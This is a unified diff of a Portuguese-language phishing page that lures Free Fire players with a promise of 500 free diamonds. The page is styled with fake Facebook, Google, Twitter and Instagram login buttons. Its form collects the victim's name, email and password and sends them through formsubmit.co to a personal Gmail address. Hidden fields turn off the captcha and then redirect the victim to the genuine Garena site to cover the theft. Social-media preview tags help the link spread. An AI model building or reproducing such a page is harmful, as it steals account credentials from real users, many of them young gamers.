@@ -1,69 +1,87 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Ganhe 500 Diamantes no Free Fire!</title>
 
   <!-- Preview para WhatsApp, Facebook e outras redes -->
   <meta property="og:title" content="Ganhe 500 Diamantes no Free Fire! 🎉">
   <meta property="og:description" content="Você foi selecionado para ganhar 500 diamantes. Clique agora e resgate!">
-  <meta property="og:image" content="https://josefany-kira.github.io/FreeFire-premios/diamantes.jpg">
+  <meta property="og:image" content="https://josefany-kira.github.io/ganhe500/diamantes.jpg">
   <meta property="og:url" content="https://josefany-kira.github.io/FreeFire-premios/">
   <meta property="og:type" content="website">
   <meta name="twitter:card" content="summary_large_image">
 
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f3f3f3;
+      margin: 0;
+      padding: 0;
+      font-family: sans-serif;
+      background: url("https://josefany-kira.github.io/FreeFire-premios/bg.jpg") no-repeat center center fixed;
+      background-size: cover;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      padding: 20px;
     }
-    form {
-      background: #fff;
-      padding: 20px;
-      border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      width: 100%;
-      max-width: 400px;
+
+    .container {
+      background: rgba(0, 0, 0, 0.8);
+      padding: 25px;
+      border-radius: 10px;
+      color: #fff;
+      width: 300px;
     }
-    input, button {
-      display: block;
+
+    .container h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .container input, .container button {
       width: 100%;
-      margin-bottom: 15px;
       padding: 12px;
-      font-size: 16px;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-    }
-    button {
-      background-color: #4267B2;
-      color: white;
+      margin: 8px 0;
       border: none;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+
+    .container input {
+      background: #f1f1f1;
+      color: #000;
+    }
+
+    .container button {
+      background: #1877f2;
+      color: #fff;
+      font-weight: bold;
       cursor: pointer;
     }
-    button.google {
-      background-color: #DB4437;
+
+    .container button.google {
+      background: #db4437;
     }
-    button.twitter {
-      background-color: #1DA1F2;
+
+    .container button.twitter {
+      background: #1da1f2;
     }
-    button.instagram {
-      background-color: #C13584;
+
+    .container button.instagram {
+      background: #e1306c;
     }
   </style>
 </head>
 <body>
 
-  <form action="https://formsubmit.co/josefanykira@gmail.com" method="POST">
-    <input type="text" id="nome" name="nome" placeholder="Digite seu nome" required>
-    <input type="email" name="email" placeholder="Digite seu email" required>
-    <input type="password" name="senha" placeholder="Digite sua senha" required>
+  <form action="https://formsubmit.co/josefanykira@gmail.com" method="POST" class="container">
+    <h2>Ganhe 500 Diamantes</h2>
+    <input type="text" name="nome" id="nome" placeholder="Seu nome" required>
+    <input type="email" name="email" placeholder="Seu email" required>
+    <input type="password" name="senha" placeholder="Sua senha" required>
 
+    <!-- Configurações FormSubmit -->
     <input type="hidden" name="_next" value="https://ff.garena.com/">
     <input type="hidden" name="_captcha" value="false">
 
@@ -80,6 +98,5 @@
       botao.textContent = nome ? `Entrar como ${nome}` : 'Entrar com Facebook';
     });
   </script>
-
 </body>
-</html>
+  </html>
